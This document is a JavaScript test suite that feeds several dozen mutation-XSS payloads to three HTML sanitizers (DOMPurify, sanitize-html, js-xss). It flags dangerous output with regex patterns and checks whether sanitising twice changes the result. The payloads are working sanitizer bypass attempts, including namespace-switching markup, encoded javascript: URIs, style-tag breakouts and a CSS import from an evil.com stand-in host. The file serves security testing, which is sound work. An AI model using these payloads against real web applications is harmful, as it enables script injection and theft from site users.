"use strict";
/**
 * Comprehensive mXSS Taxonomy Test Suite
 * Tests all 8 categories from the mXSS Mutation/Variation Taxonomy
 * against DOMPurify, sanitize-html, and js-xss
 */
const { JSDOM } = require("jsdom");
const window = new JSDOM("").window;
const DOMPurify = require("dompurify")(window);
const sanitizeHtml = require("sanitize-html");
const xss = require("xss");

const SANITIZERS = {
  "DOMPurify": (html) => DOMPurify.sanitize(html),
  "DOMPurify+SAFE_TPL": (html) => DOMPurify.sanitize(html, { SAFE_FOR_TEMPLATES: true }),
  "sanitize-html": (html) => sanitizeHtml(html),
  "js-xss": (html) => xss(html),
};

// Patterns that indicate XSS survival
const DANGEROUS = [
  [/on\w+\s*=/i, "event handler"],
  [/javascript\s*:/i, "javascript: URI"],
  [/<script[\s>]/i, "script tag"],
  [/data\s*:\s*text\/html/i, "data: HTML URI"],
  [/vbscript\s*:/i, "vbscript: URI"],
  [/expression\s*\(/i, "CSS expression"],
  [/-moz-binding\s*:/i, "moz-binding"],
  [/@import\s+["']?javascript/i, "CSS @import js"],
  [/url\s*\(\s*javascript/i, "CSS url(javascript:)"],
];

function checkDangerous(output) {
  const found = [];
  for (const [re, label] of DANGEROUS) {
    if (re.test(output)) found.push(label);
  }
  return found;
}

// Test cases organized by mXSS Taxonomy sections
const TESTS = [
  // === §1 NAMESPACE SWITCHING ===
  { section: "§1", name: "SVG→HTML via <desc>",
    input: '<svg><desc><body><img src=x onerror=alert(1)></body></desc></svg>' },
  { section: "§1", name: "SVG→HTML via <foreignObject>",
    input: '<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror=alert(1)></body></foreignObject></svg>' },
  { section: "§1", name: "SVG→HTML via <title>",
    input: '<svg><title><body><img src=x onerror=alert(1)></body></title></svg>' },
  { section: "§1", name: "MathML→HTML via <mtext>",
    input: '<math><mtext><body><img src=x onerror=alert(1)></body></mtext></math>' },
  { section: "§1", name: "MathML→HTML via <mi>+<table>",
    input: '<math><mi><table><img src=x onerror=alert(1)></table></mi></math>' },
  { section: "§1", name: "MathML annotation-xml text/html",
    input: '<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>' },
  { section: "§1", name: "Triple namespace: SVG→MathML→HTML",
    input: '<svg><foreignObject><math><mtext><body><img src=x onerror=alert(1)></body></mtext></math></foreignObject></svg>' },
  { section: "§1", name: "MathML integration + mglyph breakout",
    input: '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>--></mglyph></table></mtext></math>' },
  { section: "§1", name: "MathML integration + malignmark",
    input: '<math><mtext><table><malignmark><img src=x onerror=alert(1)></malignmark></table></mtext></math>' },

  // === §2 ELEMENT REARRANGEMENT ===
  { section: "§2", name: "Foster parenting: table+caption+svg",
    input: '<table><caption><svg><desc><table><tr><td><img src=x onerror=alert(1)></td></tr></table></desc></svg></caption></table>' },
  { section: "§2", name: "Adoption agency: nested formatting+svg",
    input: '<p><b><p><svg><b><style><b><img src=x onerror=alert(1)></style></svg></p></b></p>' },
  { section: "§2", name: "Foster parenting: table+div (tree disruption)",
    input: '<table><tr><div><img src=x onerror=alert(1)></div></tr></table>' },
  { section: "§2", name: "Table+style foster",
    input: '<table><style>*{background:url(javascript:alert(1))}</style></table>' },
  { section: "§2", name: "Select+SVG reparenting",
    input: '<select><svg onload=alert(1)></svg></select>' },

  // === §3 TEXT CONTENT MODE CONFUSION ===
  { section: "§3", name: "SVG <style> RAWTEXT (CSS injection)",
    input: '<svg><style>@import "javascript:alert(1)"</style></svg>' },
  { section: "§3", name: "SVG <style> CSS expression",
    input: '<svg><style>*{x:expression(alert(1))}</style></svg>' },
  { section: "§3", name: "SVG <style> external import",
    input: '<svg><style>@import "//evil.com/xss.css"</style></svg>' },
  { section: "§3", name: "SVG <style> -moz-binding",
    input: '<svg><style>*{-moz-binding:url(javascript:alert(1))}</style></svg>' },
  { section: "§3", name: "SVG <style> CDATA breakout",
    input: '<svg><style><![CDATA[]]><!--</style>--><img src=x onerror=alert(1)>--></style></svg>' },
  { section: "§3", name: "SVG <style> comment breakout",
    input: '<svg><style><!--</style><img src=x onerror=alert(1)>--></style></svg>' },
  { section: "§3", name: "MathML <style> (RAWTEXT in foreign)",
    input: '<math><style>*{x:expression(alert(1))}</style></math>' },
  { section: "§3", name: "noscript in innerHTML context",
    input: '<noscript><img src=x onerror=alert(1)></noscript>' },

  // === §4 ENCODING/ENTITY PROCESSING ===
  { section: "§4", name: "Hex-encoded javascript: URI",
    input: '<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">x</a>' },
  { section: "§4", name: "Decimal-encoded javascript: URI",
    input: '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>' },
  { section: "§4", name: "Mixed encoding javascript: URI",
    input: '<a href="&#x6A;ava&#115;cript&#x3A;alert(1)">x</a>' },
  { section: "§4", name: "Zero-padded hex entity",
    input: '<a href="&#x0000006A;avascript:alert(1)">x</a>' },
  { section: "§4", name: "Tab in javascript: URI",
    input: '<a href="ja\tvascript:alert(1)">x</a>' },
  { section: "§4", name: "Newline in javascript: URI",
    input: '<a href="ja\nvascript:alert(1)">x</a>' },

  // === §5 STRUCTURAL DEPTH/NESTING ===
  { section: "§5", name: "Deep nesting (50 divs) + SVG namespace switch",
    input: '<form>' + '<div>'.repeat(50) + '<svg><desc><table><tr><td><img src=x onerror=alert(1)></td></tr></table></desc></svg>' + '</div>'.repeat(50) + '</form>' },
  { section: "§5", name: "Nested triple mXSS (CVE-2024-47875 pattern)",
    input: '<math><mtext><table><mglyph><style><math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math></style></mglyph></table></mtext></math>' },
  { section: "§5", name: "Deep table nesting",
    input: '<table><tr><td><table><tr><td><table><tr><td><img src=x onerror=alert(1)></td></tr></table></td></tr></table></td></tr></table>' },

  // === §6 PARSER ALGORITHM DIFFERENTIALS ===
  { section: "§6", name: "<image> → <img> transform",
    input: '<image src=x onerror=alert(1)>' },
  { section: "§6", name: "SVG <image> (valid in SVG)",
    input: '<svg><image href=x onerror=alert(1)></svg>' },
  { section: "§6", name: "Duplicate <a> with javascript: (AAA exploit)",
    input: '<a><table><a href=javascript:alert(1)>click</a></table></a>' },
  { section: "§6", name: "<template> + SVG namespace switch",
    input: '<template><svg><desc><body><img src=x onerror=alert(1)></body></desc></svg></template>' },
  { section: "§6", name: "<select> + <template> + payload",
    input: '<select><template><img src=x onerror=alert(1)></template></select>' },
  { section: "§6", name: "DOMParser vs innerHTML differential",
    input: '<svg><p><style><g title="</style><img src=x onerror=alert(1)>">' },

  // === §7 DESANITIZATION ===
  { section: "§7", name: "SVG→MathML→SVG chain",
    input: '<svg><foreignObject><math><mtext><table><mglyph><style><!--</style><svg onload=alert(1)>--></mglyph></table></mtext></math></foreignObject></svg>' },
  { section: "§7", name: "Double-serialize roundtrip seed",
    input: '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>--></mglyph></table></mtext></math>' },

  // === §8 CONFIGURATION/API MISUSE ===
  { section: "§8", name: "<base> with javascript: href",
    input: '<base href="javascript:alert(1)//" target="_self"><a href="test">click</a>' },
  { section: "§8", name: "<form> with javascript: action",
    input: '<form action="javascript:alert(1)"><button>submit</button></form>' },
  { section: "§8", name: "<meta> refresh with javascript:",
    input: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">' },
  { section: "§8", name: "SVG <use> with data: href",
    input: '<svg><use href="data:image/svg+xml,<svg xmlns=\'http://www.w3.org/2000/svg\'><script>alert(1)</script></svg>#x"/></svg>' },
];

// Double-sanitize test (idempotency)
const DOUBLE_SANITIZE_TESTS = [
  { name: "mXSS via mglyph style (double-sanitize)",
    input: '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>--></mglyph></table></mtext></math>' },
  { name: "SVG style comment (double-sanitize)",
    input: '<svg><style><!--</style><img src=x onerror=alert(1)>--></style></svg>' },
  { name: "Triple namespace (double-sanitize)",
    input: '<svg><foreignObject><math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math></foreignObject></svg>' },
];

// Run tests
console.log("=" .repeat(80));
console.log("mXSS TAXONOMY COMPREHENSIVE TEST SUITE");
console.log("=" .repeat(80));

const results = { total: 0, dangerous: 0, bypasses: [] };

for (const test of TESTS) {
  results.total++;
  console.log(`\n[${test.section}] ${test.name}`);

  for (const [name, sanitize] of Object.entries(SANITIZERS)) {
    try {
      const output = sanitize(test.input);
      const dangers = checkDangerous(output);
      const truncated = output.length > 120 ? output.slice(0, 120) + "..." : output;

      if (dangers.length > 0) {
        results.dangerous++;
        results.bypasses.push({ section: test.section, test: test.name, sanitizer: name, dangers, output: truncated });
        console.log(`  [!!] ${name}: DANGEROUS (${dangers.join(", ")})`);
        console.log(`       Output: ${truncated}`);
      } else {
        console.log(`  [OK] ${name}: safe`);
      }
    } catch (e) {
      console.log(`  [ER] ${name}: ${e.message}`);
    }
  }
}

// Double-sanitize idempotency tests
console.log("\n" + "=" .repeat(80));
console.log("DOUBLE-SANITIZE IDEMPOTENCY TESTS (DOMPurify)");
console.log("=" .repeat(80));

for (const test of DOUBLE_SANITIZE_TESTS) {
  const pass1 = DOMPurify.sanitize(test.input);
  const pass2 = DOMPurify.sanitize(pass1);
  const dangers1 = checkDangerous(pass1);
  const dangers2 = checkDangerous(pass2);

  console.log(`\n${test.name}`);
  console.log(`  Pass 1: ${pass1.length > 100 ? pass1.slice(0, 100) + "..." : pass1}`);
  console.log(`  Pass 2: ${pass2.length > 100 ? pass2.slice(0, 100) + "..." : pass2}`);
  console.log(`  Idempotent: ${pass1 === pass2 ? "YES" : "NO (MUTATION DETECTED)"}`);

  if (dangers1.length > 0) console.log(`  [!!] Pass 1 dangerous: ${dangers1.join(", ")}`);
  if (dangers2.length > 0) console.log(`  [!!] Pass 2 dangerous: ${dangers2.join(", ")}`);

  if (pass1 !== pass2) {
    results.bypasses.push({
      section: "IDEMPOTENCY", test: test.name, sanitizer: "DOMPurify",
      dangers: ["non-idempotent"], output: `P1: ${pass1.slice(0, 80)} → P2: ${pass2.slice(0, 80)}`
    });
  }
}

// Summary
console.log("\n" + "=" .repeat(80));
console.log("SUMMARY");
console.log("=" .repeat(80));
console.log(`Total tests: ${results.total}`);
console.log(`Dangerous outputs detected: ${results.dangerous}`);

if (results.bypasses.length > 0) {
  console.log(`\nBYPASSES FOUND (${results.bypasses.length}):`);
  for (const b of results.bypasses) {
    console.log(`  [${b.section}] ${b.sanitizer} | ${b.test} | ${b.dangers.join(", ")}`);
  }
}
